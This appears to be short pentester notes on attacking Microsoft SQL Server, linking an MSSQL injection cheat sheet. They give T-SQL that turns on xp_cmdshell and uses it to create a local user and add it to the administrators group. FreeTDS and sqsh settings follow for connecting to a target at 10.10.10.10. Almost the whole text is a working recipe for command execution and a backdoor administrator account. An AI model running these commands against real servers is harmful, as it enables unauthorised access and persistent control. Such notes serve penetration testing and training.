http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet



```
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
xp_cmdshell "net user gary password /add"
go
xp_cmdshell "net localgroup administrators gary /add"
go
```


### FreeTDS Config

> vim /etc/freetds/freetds.conf

Add following:

```
 [HOSTNAME]
          host=10.10.10.10
          port=9999
          tds version = 7.0
```

Connect:

> sqsh -S HOSTNAME
